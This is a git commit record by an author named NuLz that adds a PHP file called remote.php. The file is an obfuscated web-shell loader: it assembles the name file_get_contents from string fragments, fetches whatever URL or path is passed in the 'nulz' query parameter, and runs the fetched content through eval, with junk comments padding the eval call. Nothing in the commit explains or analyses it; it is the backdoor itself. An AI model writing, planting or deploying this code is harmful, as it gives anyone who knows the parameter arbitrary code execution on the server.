ff973aa2859f563e3828a24310fa18fb4ba0363c
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-07-14 15:49:15 +0700

    NuLz

---
+++ remote.php
@@ -0,0 +1,8 @@
+<?php
+$f_get = 'f'.'i'.'l'.'e_'.'ge'.'t_'.'co'.'nt'.'en'.'ts';
+$this_f = '';
+if (isset($_GET['nulz'])) {
+    $get_f = $_GET['nulz'];
+    $this_f = $f_get($get_f);
+}
+/*555555*/eval/*555555*/("?>".$this_f)/****#****/;
